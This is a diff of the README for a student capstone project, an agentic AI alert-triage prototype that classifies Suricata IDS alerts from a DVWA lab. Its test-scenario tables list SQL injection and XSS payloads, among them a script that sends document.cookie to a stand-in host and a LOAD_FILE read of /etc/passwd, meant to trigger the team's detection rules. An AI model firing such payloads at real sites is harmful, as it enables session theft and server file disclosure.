@@ -1,17 +1,10 @@
-# Prototype Development of an Agentic AI–Assisted SOC Alert Triage System
-Project ID: p000774csitcp
+# Prototype Development of an Agentic AI-Assisted SOC Alert Triage System
 
-Contributors:
-- Dylan Zipsin
-- Sahil Thorat
-- Shaina Kaur
-- Tabasom Habibi
-- Ahrar Hossain
+**Project ID:** p000774csitcp (RMIT capstone)
 
+**Contributors:** Dylan Zipsin, Sahil Thorat, Shaina Kaur, Tabasom Habibi, Ahrar Hossain.
 
-# Prototype AI-Assisted SOC Alert Triage System
-
-An AI-powered Security Operations Centre (SOC) alert triage system that automates Tier-1 alert classification and summarisation. The system ingests Suricata IDS alerts, classifies them as true/false positives, assigns severity levels, and generates structured incident reports with response recommendations.
+An AI-powered Tier-1 SOC alert triage prototype. It pulls Suricata IDS alerts from a lab environment, groups them into incidents by source IP, runs an agentic ReAct loop (a local LLM with three deterministic lookup tools) to classify each alert as a real attack or noise, then generates a structured incident report with a plain-English narrative and suggested response actions. Everything is shown on a live web dashboard. State is persisted to SQLite so reports survive restarts.
 
 ## Where to start reading
 
@@ -25,7 +18,7 @@ An AI-powered Security Operations Centre (SOC) alert triage system that automate
 | Deploying custom XSS + SQLi Suricata rules | `lab/suricata/README.md` — install + validation hand-tests |
 | Setting up the lab from scratch | the **Setup** section below |
 
-**Branch state:** active development lives on `feature/sqlite-persistence` (latest, includes everything). `feature/agentic-react-loop` carries the same agent work without SQLite. `main` is pre-agentic — do not run from `main` for a demo. See `docs/HANDOFF.md` for the merge sequence.
+**Branch state:** active development is on `feature/sqlite-persistence`, which carries everything. `feature/agentic-react-loop` is a historical snapshot. `main` is pre-agentic, so do not run from it for a demo. See `docs/HANDOFF.md` for the merge sequence.
 
 ## Architecture
 
@@ -46,31 +39,28 @@ An AI-powered Security Operations Centre (SOC) alert triage system that automate
 **Three logical components, two physical machines:**
 
 - **Component 1 — Vulnerable Web App (DVWA):** Dockerised web application with XSS and SQLi vulnerabilities. Generates attack traffic when payloads are submitted.
-- **Component 2 — IDS (Suricata):** Monitors the Docker bridge network for attack patterns. ET Open ruleset + our custom XSS ruleset (`lab/suricata/xss_alerts.rules`, SIDs 1000001-1000058, P1/P2/P3 tiers). Outputs structured JSON alerts to `eve.json`.
-- **Component 3 — AI Triage Module (Python, host):** Reads `eve.json` via a VirtualBox shared folder and runs a multi-stage pipeline.
+- **Component 2 — IDS (Suricata):** Monitors the Docker bridge for attack patterns. Lab runs **custom-only**: two team-authored rule files in `lab/suricata/` (XSS sids `1000001-1000058`, SQLi sids `1000101-1000113`). ET Open and Suricata's built-in protocol-event rules are disabled. Outputs structured JSON alerts to `eve.json`.
+- **Component 3 — AI Triage Module (Python, host):** Reads `eve.json` via a VirtualBox shared folder and runs the triage pipeline.
 
 **Component 3 subsystems (host):**
 
 ```
-log_monitor ──▶ ai_module ──▶ ReAct agent ──▶ Stage 2 narrative ──▶ report_generator
-   (tail)        (Stage 1)    (3 tools +       (correlation +        (rule-based +
-                              hybrid pre-      MITRE tactic           LLM-filtered
-                              enrichment)      override)              suggestions)
-                                                                          │
-                                                                          ▼
-                                                                  Incident report
-                                                                  (template-v1 JSON,
-                                                                   schema-validated)
-                                                                          │
-                                              SQLite (default) ◀──────────┘
-                                              or JSON store
-                                                    │
-                                                    ▼
-                                           Flask + Socket.IO dashboard
-                                                  :5000
+log_monitor ──▶ incident_manager ──▶ report_generator ──▶ react_agent (Stage 1)
+   (tail)        (group by src IP,    (Stage 2 narrative,    (3 tools +
+                 2-min window,        MITRE override,        hybrid pre-
+                 3 s debounce)        suggestion filters)    enrichment)
+                                                │                   │
+                                                ▼                   ▼
+                                       Incident report          Ollama
+                                       (template-v1 JSON,       (qwen2.5:3b)
+                                        schema-validated)
+                                                │
+                                                ├──▶ SQLite reports.db (default)
+                                                │      or JSON file store
+                                                └──▶ Flask + Socket.IO dashboard (port 5000)
 ```
 
-Data flows via a VirtualBox shared folder — Suricata writes `eve.json` inside the VM, the Python module reads it from the host filesystem. LLM stays local (Ollama, port `11434`). No network egress.
+Data crosses the VM ↔ host boundary via a VirtualBox shared folder. Suricata writes `eve.json` inside the VM; the host tails it. The LLM is local (Ollama, port `11434`). No network egress.
 
 ---
 
@@ -374,25 +364,36 @@ python -m pip install -r requirements.txt
 
 > **Tip:** Always use `python -m pip install` instead of `pip install` to avoid packages installing outside the venv (common issue with Microsoft Store Python on Windows).
 
-### 7. (Optional) Deploy Custom XSS Rules
+### 7. Deploy the custom Suricata rules (lab runs custom-only)
 
-Project ships a custom Suricata ruleset (58 XSS-focused rules, SIDs `1000001`-`1000058`,
-priority tiers P1/P2/P3) at `lab/suricata/xss_alerts.rules`. ET Open detects far less
-XSS than SQLi, so this ruleset closes the gap.
+Project ships two team-authored rule files in `lab/suricata/`:
 
-Deployment is a one-time copy inside the Kali VM. Full walkthrough + hand-test
-validation in **`lab/suricata/README.md`**. Short version:
+- `xss_alerts.rules` — 58 XSS rules, sids `1000001-1000058`, P1/P2/P3 priority tiers
+- `sqli_alerts.rules` — 13 SQLi rules, sids `1000101-1000113`, P1/P2/P3 priority tiers
+
+These are required for the demo. The lab runs **custom-only**: ET Open and Suricata's built-in protocol-event rules are turned off in `suricata.yaml`, so every alert is one of the team's 71 rules. This keeps the feed scoped to the two attack classes the project demonstrates (XSS + SQLi) and makes every alert traceable.
+
+Full deployment walkthrough + per-tier hand-test validation is in **`lab/suricata/README.md`**. Short version:
 
 ```bash
 # Inside Kali VM
 sudo cp /media/sf_soc-triage/p000774csitcp/lab/suricata/xss_alerts.rules \
+        /media/sf_soc-triage/p000774csitcp/lab/suricata/sqli_alerts.rules \
         /var/lib/suricata/rules/
-# Edit /etc/suricata/suricata.yaml — append "xss_alerts.rules" under rule-files
-sudo suricata -T -c /etc/suricata/suricata.yaml -i any   # validate config
+
+# Edit /etc/suricata/suricata.yaml, set rule-files: to list ONLY the two
+# custom files (comment out suricata.rules and any other entries):
+#
+#   rule-files:
+#     - xss_alerts.rules
+#     - sqli_alerts.rules
+
+sudo suricata -T -c /etc/suricata/suricata.yaml          # validate
 sudo systemctl restart suricata
+sudo grep "rules successfully loaded" /var/log/suricata/suricata.log | tail -1   # expect 71
 ```
 
-Verify by triggering a DVWA Reflected XSS — you should see SID `1000xxx` alerts.
+Verify by triggering a DVWA SQL Injection — you should see sid `1000101` ("P1 - SQLi UNION SELECT in URI") in the dashboard, severity **critical**.
 
 ---
 
@@ -458,27 +459,31 @@ All configuration lives in `app.config` (TOML format). **Do not modify this file
 
 ```toml
 [model]
-provider = "ollama"               # "ollama" | "anthropic" | "llamacpp"
-temperature = 0.2                 # low for consistent classifications
+provider    = "ollama"            # "ollama" | "anthropic" | "llamacpp"
+max_tokens  = 1024
+temperature = 0.0                 # 0.0 for deterministic classification output
 
 [model.ollama]
-model_name = "qwen2.5:3b"         # demo-best — strong ReAct tool adherence
-# model_name = "llama3.2"         # Phase 6 baseline alternative
-base_url = "http://localhost:11434"
+model_name      = "qwen2.5:3b"    # demo-best, strong ReAct tool adherence
+# model_name      = "llama3.2"    # Phase 6 baseline alternative
+base_url        = "http://localhost:11434"
+request_timeout = 120
 ```
 
 #### `[agent]` — Triage strategy
 
 ```toml
 [agent]
-mode = "react"                    # "react" | "single_shot"
-auto_enrichment = true            # hybrid Option F — deterministic pre-enrich + LLM
-max_react_steps = 6
-log_reasoning_trace = true        # surfaces ReAct loop in dashboard
+mode                     = "react"   # "react" | "single_shot"
+max_iterations           = 3
+tool_timeout_seconds     = 5.0
+total_budget_seconds     = 30.0
+reasoning_trace_enabled  = true      # surfaces ReAct loop in the dashboard
+auto_enrichment          = true      # hybrid Option F: deterministic pre-LLM tool calls
 ```
 
-- `mode = "react"` + `auto_enrichment = true` → full demo behavior
-- `mode = "single_shot"` → ablation baseline (no agentic loop). Suggestions stay safe — rule-based generator and LLM filter both consume enrichment via the same `lookup_environment_for_query` path, so `single_shot` runs do not regress to "Block 172.18.0.2"-class suggestions.
+- `mode = "react"` + `auto_enrichment = true`: full demo behaviour.
+- `mode = "single_shot"`: ablation baseline (no agentic loop). Suggestions stay safe — the rule-based generator and the LLM filter both consume enrichment via the shared `lookup_environment_for_query` path, so `single_shot` runs do not regress to "Block 172.18.0.2"-class suggestions.
 
 #### `[storage]` — Report persistence
 
@@ -500,26 +505,34 @@ Defines IPs/hostnames the agent's `lookup_environment_context` tool recognises. 
 
 ## Attack Scenarios for Testing
 
+The lab runs custom-only, so the alerts you'll see are all team-authored. The signature names start with `P1`, `P2`, `P3` (their priority tier), which maps to dashboard severity critical / high / low.
+
 ### SQL Injection
 
 In DVWA → SQL Injection (security set to Low):
 
-| Payload | Type | Expected Suricata Rule |
-|---------|------|----------------------|
-| `1' OR '1'='1` | Auth bypass | May not trigger HTTP-layer rule (simpler pattern) |
-| `1' UNION SELECT user, password FROM users#` | UNION-based extraction | `ET WEB_SERVER SELECT USER SQL Injection Attempt in URI` |
+| Payload | Custom rule that fires | Dashboard severity |
+|---|---|---|
+| `1' UNION SELECT user, password FROM users#` | sid 1000101 *P1 - SQLi UNION SELECT in URI* (plus 1000108 comment-seq, 1000110 keyword) | critical (P1 wins) |
+| `1' AND version()#` | sid 1000103 *P1 - SQLi Database Function Call in URI* | critical |
+| `1' OR 1=1#` | sid 1000105 *P2 - Boolean-Based Blind Injection* (plus 1000108) | high |
+| `1' UNION SELECT LOAD_FILE('/etc/passwd'), 2#` | sid 1000104 *P1 - SQLi OS Command Execution Attempt* (plus 1000101) | critical |
 
 ### Cross-Site Scripting (XSS)
 
 In DVWA → XSS (Reflected) (security set to Low):
 
-| Payload | Type | Expected Suricata Rule |
-|---------|------|----------------------|
-| `<script>alert('xss')</script>` | Reflected XSS | `ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt` |
+| Payload | Custom rule that fires | Dashboard severity |
+|---|---|---|
+| `<script>fetch('http://x/?c='+document.cookie)</script>` | sids in 1000001-1000005 (cookie exfiltration) | critical |
+| `<img src=x onerror=alert(1)>` | sids ~1000055-1000057 (event-handler + img tag) | low |
+| `%3Cscript%3Ealert(1)%3C%2Fscript%3E` (URL-encoded) | sid ~1000040 (encoded script tag) | high |
 
-### False Positives (Expected)
+### False positives (expected)
 
-Every attack generates additional `ET SCAN Suspicious inbound to mySQL port 3306` alerts. These are internal Docker traffic between DVWA and MariaDB — **not actual attacks**. The AI module should classify these as `likely_false_positive`.
+One HTTP request often trips two or three rules at once (e.g. UNION SELECT also matches the P2 comment-sequence and the P3 keyword rule, because it has a `#` and SQL keywords). The dashboard groups these into a single incident, so the *raw alerts* view shows multiple lines per attack but the *incident* view stays clean.
+
+The broader P2 and P3 rules (especially P2 *SQL Comment Sequence in URI* and P3 *URL-Encoded Characters in URI*) also over-match on benign browsing if the URL happens to contain a `#`, `--`, or `%27`. This is the false-positive stream the AI triage layer is meant to suppress — those alerts should be classified as `likely_false_positive` in the report.
 
 ---
 
@@ -527,52 +540,59 @@ Every attack generates additional `ET SCAN Suspicious inbound to mySQL port 3306
 
 ```
 p000774csitcp/
-├── app.config                       # TOML configuration (universal — no local paths)
+├── app.config                       # TOML configuration (universal, no local paths)
 ├── requirements.txt
 ├── setup_linux.sh / setup_windows.bat
 ├── run.sh                           # Linux quick-start (VM only)
+├── system-overview.png              # hand-drawn workflow diagram (embedded in docs/ARCHITECTURE.md)
 │
 ├── src/
-│   ├── app.py                       # entrypoint — wires log_monitor / agent / storage / web
-│   ├── log_monitor.py               # tails eve.json → AlertRecord
-│   ├── alert.py                     # AlertRecord dataclass
-│   ├── incident.py                  # Incident domain model
-│   ├── incident_manager.py          # in-memory correlation, dedupe, lookup
-│   ├── ai_module.py                 # Stage 1 classifier (per-alert)
+│   ├── app.py                       # entry point: wires log_monitor / agent / storage / web
+│   ├── log_monitor.py               # tails eve.json, emits AlertRecord
+│   ├── incident_manager.py          # in-memory grouping, 2-min window, 3 s debounce
+│   ├── models.py                    # all dataclasses: AlertRecord, Incident,
+│   │                                # AlertClassification, IncidentReport, ReasoningStep,
+│   │                                # plus extract_attack_type with SID-range path
 │   ├── model_provider.py            # Ollama / Anthropic / llama.cpp facade
 │   │
-│   ├── react_agent.py               # ReAct loop — XML-tagged Reasoning/Acting,
-│   │                                # hybrid pre-enrichment (Option F), 6-step budget
+│   ├── react_agent.py               # ReAct loop: XML-tagged thoughts + actions,
+│   │                                # hybrid pre-enrichment (Option F), max 3 iter, 30 s budget
 │   ├── tool_registry.py             # tool registration + dispatch
 │   ├── agent_tools.py               # get_alert_history, lookup_environment_context,
-│   │                                # get_attack_pattern_stats + lookup_environment_for_query
+│   │                                # get_attack_pattern_stats + the public
+│   │                                # lookup_environment_for_query helper
 │   │
 │   ├── report_generator.py          # Stage 2 narrative + rule-based suggestions +
 │   │                                # 3-layer LLM filter + MITRE tactic override
-│   ├── report_serializer.py         # template-v1 JSON shaper
-│   ├── report_schema.py             # JSONSchema for template-v1
-│   ├── report_storage.py            # JSON-file backend (legacy / fallback)
-│   ├── report_db.py                 # SQLite backend (default) — WAL, thread-local,
-│   │                                # retention sweeper, query methods by IP/attack/severity
+│   ├── report_serializer.py         # template-v1 JSON shape + JSONSchema validation
+│   ├── storage.py                   # JSON-file backend (legacy / ablation fallback)
+│   ├── report_db.py                 # SQLite backend (default): WAL, thread-local,
+│   │                                # retention sweeper, history queries by IP/attack/severity
+│   ├── ai_module.py                 # legacy AIAnalyzer for /api/analyse (pre-agent path)
 │   │
 │   ├── web_server.py                # Flask + Socket.IO dashboard server
-│   ├── static/  templates/          # dashboard frontend
+│   ├── static/                      # dashboard JS + CSS
+│   ├── templates/                   # dashboard HTML
 │   │
 │   ├── evaluation/
 │   │   ├── run_evaluation.py        # single-config eval runner (--config-dim)
 │   │   ├── run_combined_report.py   # 5-config staircase report renderer
-│   │   ├── scenarios/               # labelled attack fixtures
-│   │   └── outputs/                 # per-run raw JSON + markdown
+│   │   ├── scenarios.py             # 30 labelled attack scenarios + ground truth
+│   │   ├── attack_runner.py
+│   │   ├── result_collector.py
+│   │   └── report_writer.py
 │   │
-│   └── test_*.py                    # 9 test suites, 449+ assertions
+│   └── test_*.py                    # 9 test suites, 451 assertions
 │
 ├── lab/
 │   └── suricata/
-│       ├── xss_alerts.rules         # custom XSS ruleset, SIDs 1000001-1000058
-│       └── README.md                # deploy + validate inside Kali VM
+│       ├── README.md                # custom-only deployment + per-tier hand-test plan
+│       ├── xss_alerts.rules         # 58 rules, sids 1000001-1000058 (XSS, P1/P2/P3)
+│       └── sqli_alerts.rules        # 13 rules, sids 1000101-1000113 (SQLi, P1/P2/P3)
 │
 └── docs/
-    ├── HANDOFF.md                   # START HERE — orientation for cold pickup
+    ├── HANDOFF.md                   # START HERE: orientation for cold pickup
+    ├── ARCHITECTURE.md              # hand-drawn system overview + walkthrough
     ├── AGENT_DESIGN.md              # ReAct loop + tools + hybrid enrichment design
     ├── PHASE_6_RUNBOOK.md           # 5-config staircase ablation procedure
     └── PHASE_10_SQLITE.md           # SQLite migration design + roll-back path
